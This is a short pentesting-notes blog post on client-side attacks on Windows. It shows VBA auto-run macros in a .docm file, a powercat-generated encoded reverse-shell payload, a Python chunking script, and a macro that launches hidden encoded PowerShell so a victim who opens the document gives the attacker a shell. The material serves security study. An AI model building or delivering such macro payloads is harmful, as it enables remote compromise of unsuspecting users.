<!DOCTYPE html>
<style>
    html {
        height: 100vh;
    }
    body {
        min-height: 100vh;
        display: grid;
        grid-template-rows: 1fr auto;
    }
    .footer {
        grid-row-start: 2;
        grid-row-end: 3;
    }
</style>
<html lang="en-us"><head>
  <meta charset="utf-8">
  <title>Cyber Ninja</title>
  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
<link rel="manifest" href="/site.webmanifest">

  <!-- mobile responsive meta -->
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <meta name="description" property="og:description" content="AK solutions, a website where I host my penetration testing notes, experience and other cyber security related stuff">
  <meta name="image" property="og:image" content="/">
  <meta name="author" content="Abdullah Khabir">
  <meta name="generator" content="Hugo 0.111.3">

  <!-- plugins -->
  
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/uikit@3.2.6/dist/css/uikit.min.css ">
  

  <!-- Main Stylesheet -->
  
  <link rel="stylesheet" href="/css/style.min.css" integrity="" media="screen">
  
  <link rel="stylesheet" href="/css/syntax.min.css" integrity="" media="screen">

  <script src="https://cdn.jsdelivr.net/npm/mailgo@0.9.14/dist/mailgo.min.js" defer></script>

  <!--Favicon-->
  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
  <link rel="manifest" href="/site.webmanifest">

</head>
<body class="pentesting">
    <div class="wrapper"><div uk-sticky="sel-target: .uk-navbar-container; cls-active: uk-navbar-sticky; bottom: #transparent-sticky-navbar">
    <nav class="uk-navbar-container uk-margin" uk-navbar="mode: click;" style="padding-right: 3rem">
        <div class="uk-navbar-right">
            <ul class="uk-navbar-nav uk-visible@s">
                
                <li><a style="font-size: 25px; text-transform: none" href="/"> Home
                        </a></li>

                
                
                
                
                
                
                
                
                
                <li><a style="font-size: 25px; text-transform: none" href="/about">About</a></li>
                
                
                
                
                
                
                
                
                
                <li class="uk-active"><a style="font-size: 25px; text-transform:none"
                        href="/pentesting">Pentesting</a></li>
                
                
                
                
                
                
                
                
                
                <li><a style="font-size: 25px; text-transform: none" href="/contact">Contact</a></li>
                
                
            </ul>

            <a class="uk-navbar-toggle uk-hidden@s" uk-toggle="target: #sidenav" uk-navbar-toggle-icon href="#"></a>

        </div>
    </nav>
</div>

<div id="sidenav" uk-offcanvas="overlay: true">
    <div class="uk-offcanvas-bar uk-flex uk-flex-column">

        <ul class="uk-nav uk-nav-primary uk-nav-center uk-margin-auto-vertical">
            
            <li><a style="font-size: 25px" href="https://abdullah.solutions"> Home </a></li>

            
            
            
            
            
            
            
            
            
            <li><a style="font-size: 25px" href="/about">About</a></li>
            
            
            
            
            
            
            
            
            
            <li class="uk-active"><a style="font-size: 25px" href="/pentesting">Pentesting</a></li>
            
            
            
            
            
            
            
            
            
            <li><a style="font-size: 25px" href="/contact">Contact</a></li>
            
            
        </ul>

    </div>
</div>

<script type="application/javascript">
var doNotTrack = false;
if (!doNotTrack) {
	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
	ga('create', 'UA-147400444-1', 'auto');
	
	ga('send', 'pageview');
}
</script>



<style>
  p {
    margin: 0
  }

  .people-wrap {
    display: inline-flex;
    margin-top: 10px;
  }

  .people-image {
    display: block;
    border-radius: 50%;
     
  }

  .people {
    margin-left: 20px;
    margin-right: 20px;
  }

  .name {
    margin: auto;
  }

  h1,
  h2,
  h3,
  h4,
  h5,
  h6 {
    color: #000;
    font-family: Roboto, sans-serif;
    line-height: 1.2;
    margin-top: 2rem;
  }

  .content img {
    box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19);
    display: block;
    margin-left: auto;
    margin-right: auto;
    margin-bottom:30px;
  }

  p { margin-bottom: 1em; }

  body p:last-child { margin-bottom: 0em; }

  img.skills{
    height: 80px;
  }

  @media only screen and (min-width: 960px) {
    .content img{max-width:60vw; max-height:60vh}

  .content img{
      max-width:60vw;
      max-height:60vh
  }
  }
  .content{
      width: 90vw;
      max-width: 1200px
  }

  table {
    font-family: arial, sans-serif;
    border-collapse: collapse;
    width: 100%;
  }

  td, th {
    border: 1px solid #dddddd;
    text-align: left;
    padding: 8px;
  }

</style>


<section>
  <div class="uk-container uk-margin-large-bottom uk-margin-medium-top">
    <h1 class="uk-text-center uk-heading-medium">Client Side Attacks</h1>
    <p class="uk-text-center uk-text-lead"></p>
    <p class="uk-text-center">Published on Mar 21, 2023</p>
    <p class="uk-text-center">Reading time: 2 minutes.</p>
    

    <hr class="full-width">
    

    <div class="content">
      <h3 id="client-side-attacks-for-windows">Client Side attacks for Windows</h3>
<h4 id="ms-word-macros">MS Word macros</h4>
<p>A Microsoft Word macro is a set of instructions or actions that you can record or write in Visual Basic for Applications (VBA) to automate repetitive tasks in Word. Macros can save you time by performing tasks that would otherwise need to be done manually, such as formatting text or tables, performing searches, or replacing text. You can create macros in Word by using the Macro Recorder or by writing VBA code.</p>
<p>The Macro Recorder allows you to record a series of actions in Word and save them as a macro. You can then replay the macro at any time to repeat the recorded actions. This method is useful if you don&rsquo;t have experience with VBA or if the task you want to automate is simple.</p>
<p>If the task you want to automate is more complex, you can write VBA code to create a macro. VBA is a programming language that is used to create macros in Word and other Microsoft Office applications. With VBA, you can create macros that perform more complex tasks, such as creating custom dialog boxes, working with multiple documents or files, or interacting with other applications.</p>
<p>Overall, Microsoft Word macros are a powerful tool that can save time and increase productivity by automating repetitive tasks in Word.</p>
<p>Create a document, add a macro to it and save it with <code>.docm</code> extension.</p>
<p>Here is the macro:</p>
<div class="highlight"><pre tabindex="0" style="color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Sub AutoOpen<span style="color:#2c5dcd">()</span>
</span></span><span style="display:flex;"><span>MyMacro
</span></span><span style="display:flex;"><span>End Sub
</span></span><span style="display:flex;"><span>Sub Document_Open<span style="color:#2c5dcd">()</span>
</span></span><span style="display:flex;"><span>MyMacro
</span></span><span style="display:flex;"><span>End Sub
</span></span><span style="display:flex;"><span>Sub MyMacro<span style="color:#2c5dcd">()</span>
</span></span><span style="display:flex;"><span>CreateObject<span style="color:#2c5dcd">(</span><span style="color:#0c6">&#34;Wscript.Shell&#34;</span><span style="color:#2c5dcd">)</span>.Run <span style="color:#0c6">&#34;cmd&#34;</span>
</span></span><span style="display:flex;"><span>End Sub
</span></span></code></pre></div><p>It will open <code>cmd.exe</code>.</p>
<p>Lets extend it to create a reverse shell.</p>
<p>I&rsquo;m using <code>powercat</code> here.</p>
<div class="highlight"><pre tabindex="0" style="color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>powercat -l -p <span style="color:#5918bb;font-weight:bold">4444</span> -ep -rep -ge &gt; /tmp/encoded_shell.txt
</span></span></code></pre></div><p>Check for errors/warnings in output, remove them, copy the encoded text.</p>
<p>Since VBA has a 255 characters limit so we would use a python script to split
the commands:</p>
<div class="highlight"><pre tabindex="0" style="color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#5918bb;font-weight:bold">str</span> <span style="color:#2c5dcd">=</span> <span style="color:#fff;background-color:#c00">`</span>The encoded output you copied <span style="color:#2c5dcd;font-weight:bold">from</span> last step<span style="color:#fff;background-color:#c00">`</span>
</span></span><span style="display:flex;"><span>n <span style="color:#2c5dcd">=</span> <span style="color:#5918bb;font-weight:bold">50</span>
</span></span><span style="display:flex;"><span><span style="color:#2c5dcd;font-weight:bold">for</span> i <span style="color:#2c5dcd;font-weight:bold">in</span> <span style="color:#5918bb;font-weight:bold">range</span>(<span style="color:#5918bb;font-weight:bold">0</span>, <span style="color:#5918bb;font-weight:bold">len</span>(<span style="color:#5918bb;font-weight:bold">str</span>), n):
</span></span><span style="display:flex;"><span>    <span style="color:#5918bb;font-weight:bold">print</span>(<span style="color:#0c6">&#34;Str = Str + &#34;</span> <span style="color:#2c5dcd">+</span> <span style="color:#0c6">&#39;&#34;&#39;</span> <span style="color:#2c5dcd">+</span> <span style="color:#5918bb;font-weight:bold">str</span>[i:i<span style="color:#2c5dcd">+</span>n] <span style="color:#2c5dcd">+</span> <span style="color:#0c6">&#39;&#34;&#39;</span>)
</span></span></code></pre></div><p>You can redirect the output to some file and then copy it instead of throwing it
at stdout.</p>
<p>Now modify the macro:</p>
<div class="highlight"><pre tabindex="0" style="color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Sub AutoOpen<span style="color:#2c5dcd">()</span>
</span></span><span style="display:flex;"><span>MyMacro
</span></span><span style="display:flex;"><span>End Sub
</span></span><span style="display:flex;"><span>Sub Document_Open<span style="color:#2c5dcd">()</span>
</span></span><span style="display:flex;"><span>MyMacro
</span></span><span style="display:flex;"><span>End Sub
</span></span><span style="display:flex;"><span>Sub MyMacro<span style="color:#2c5dcd">()</span>
</span></span><span style="display:flex;"><span>    Dim Str As String
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    Str <span style="color:#2c5dcd">=</span> <span style="color:#0c6">&#34;powershell.exe -nop -w hidden -E &#34;</span>
</span></span><span style="display:flex;"><span>    &lt;your code goes here&gt;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>CreateObject<span style="color:#2c5dcd">(</span><span style="color:#0c6">&#34;Wscript.Shell&#34;</span><span style="color:#2c5dcd">)</span>.Run Str
</span></span><span style="display:flex;"><span>End Sub
</span></span></code></pre></div><p>Save it. Start a listener and once the victim opens it, you will get a shell.</p>




<div id="disqus_thread"></div>
<script type="text/javascript">

(function() {
    
    
    if (window.location.hostname == "localhost")
        return;

    var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;

    var disqus_shortname = 'akpk';

    dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
})();

</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
<a href="https://disqus.com/" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>



    </div>
  </div>
  </div>
</section>






    </div>
<footer class="footer">
  <div class="uk-container">

    <div class="uk-grid-small uk-child-width-1-4@m uk-text-center uk-flex-center uk-margin-medium-bottom" uk-grid>
         </div>


    <div class="footer-copyright uk-text-center" style="padding-bottom: 1rem">
      <img loading="lazy" src="https://mirrors.creativecommons.org/presskit/icons/cc.svg" style="height: 1.2em;
  width: 1.2em;" alt="Creative Commons">
      <img loading="lazy" src="https://mirrors.creativecommons.org/presskit/icons/by.svg" style="height: 1.2em;
  width: 1.2em;" alt="CC-BY">
      2023
      Abdullah Khabir
    </div>
  </div>
</footer>


<!-- JS Plugins -->

<script src="https://cdn.jsdelivr.net/npm/uikit@3.2.6/dist/js/uikit.min.js"></script>

<script src="https://cdn.jsdelivr.net/npm/uikit@3.2.6/dist/js/uikit-icons.min.js"></script>

</body>
</html>
